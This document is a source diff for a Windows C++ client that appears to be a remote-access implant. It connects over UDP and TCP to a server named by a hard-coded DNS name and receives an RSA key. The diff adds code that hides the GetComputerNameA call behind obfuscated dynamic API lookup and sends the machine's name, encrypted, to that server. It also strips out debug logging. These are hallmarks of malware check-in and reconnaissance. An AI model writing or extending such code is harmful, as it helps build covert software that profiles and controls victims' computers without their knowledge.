@@ -3,10 +3,10 @@
 #include "procutils.h"
 #include "serialization.h"
 
-#ifdef CLIENT_RELEASE
-
 Client::Client() {
 	NetCommon::LoadWSAFunctions();
+
+	// setup udp addr
 
 	hostent* host = GetHostByName(DNS_NAME.c_str());
 	if ( host == NULL )
@@ -31,6 +31,20 @@ Client::~Client() {
 	ProcessUtilities::FreeUsedLibrary(winsock32);
 }
 
+void Client::InsertComputerName() {
+	using namespace ProcessUtilities;
+	char  buffer[256];
+	DWORD buffSize = sizeof(buffer);
+
+	// get computer name
+	BOOL success = GetFunctionAddress<PPROCFN::_GetComputerNameA>(
+		GetLoadedLib(freqDLLS::kernel32),
+		std::string(HIDE("GetComputerNameA")))( buffer, &buffSize );
+
+	if ( success )
+		this->ComputerName = buffer;
+}
+
 BOOL Client::Connect() {
 	// make request to udp server
 	this->UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -46,15 +60,11 @@ BOOL Client::Connect() {
 	if ( !validServerResponse )
 		return FALSE;  
 
-	CLIENT_DBG("sent the request...");
-
 	UDPResponse response;
 	sockaddr_in serverAddr;
 	BOOL received = ReceiveMessageFromServer(this->UDPServerDetails, response, serverAddr);
 	if ( !received )
 		return FALSE;
-
-	CLIENT_DBG("received a message from the server..");
 
 	this->UDPServerDetails.addr = serverAddr;
 	this->TCPServerDetails = response.TCPServer;
@@ -67,29 +77,37 @@ BOOL Client::Connect() {
 	int connect = ConnectSocket(this->TCPSocket, ( sockaddr* ) &this->TCPServerDetails.addr, sizeof(this->TCPServerDetails.addr));
 	if ( connect == SOCKET_ERROR )
 		return FALSE;
-	
-	RSAKeys key = RSAKeys(GetPublicRSAKeyFromServer(), nullptr);
-	this->SetEncryptionKeys(key);
 
-	CLIENT_DBG("Connected");
+	GetPublicRSAKeyFromServer();
 	return TRUE;
 }
 
-BIO* Client::GetPublicRSAKeyFromServer() {
+BOOL Client::SendComputerNameToServer() {
+	InsertComputerName();
+	BYTESTRING computerName = Serialization::SerializeString(this->ComputerName);
+
+	BIO* key = NetCommon::GetBIOFromString(this->Secrets.strPublicKey);
+	BOOL success = NetCommon::TransmitData(computerName, this->TCPSocket, TCP, NetCommon::_default, TRUE, key, FALSE);
+	BIO_free(key);
+	return success;
+}
+
+BOOL Client::GetPublicRSAKeyFromServer() {
 	// receive the rsa public key
 	BYTESTRING serialized;
-		
+
 	BOOL success = NetCommon::ReceiveData(serialized, this->TCPSocket, TCP);
 	if ( !success )
-		return nullptr;
+		return FALSE;
 	
 	// the base64 encoded ras key
 	std::string base64 = Serialization::BytestringToString(serialized);
 	std::string bio = "";
 	macaron::Base64::Decode(base64, bio);
+	
+	this->Secrets.strPublicKey = bio;
 
-	BIO* pub = NetCommon::GetBIOFromString(( char* ) bio.c_str(), bio.length());
-	return pub;
+	return !this->Secrets.strPublicKey.empty();
 }
 
 template <typename _Ty>
@@ -112,12 +130,14 @@ BOOL Client::SendMessageToServer(Server dest, ClientMessage message, sockaddr_in
 }
 
 BOOL Client::SendEncryptedMessageToServer(Server dest, ClientMessage message) {
+	BIO* pk = NetCommon::GetBIOFromString(this->Secrets.strPublicKey);
+	BOOL success = FALSE;
 	if ( dest.type == SOCK_STREAM ) // tcp
-		return NetCommon::TransmitData(message, this->TCPSocket, TCP, NetCommon::_default, TRUE, this->Secrets.publicKey);
+		success = NetCommon::TransmitData(message, this->TCPSocket, TCP, NetCommon::_default, TRUE, pk, FALSE);
 	else if ( dest.type == SOCK_DGRAM ) // udp
-		return NetCommon::TransmitData(message, this->UDPSocket, UDP, NetCommon::_default, TRUE, this->Secrets.publicKey);
+		success = NetCommon::TransmitData(message, this->UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);
 
-	return FALSE;
+	return success;
 }
 
 BOOL Client::Disconnect() {
@@ -128,5 +148,3 @@ BOOL Client::Disconnect() {
 
 	return TRUE;
 }
-
-#endif
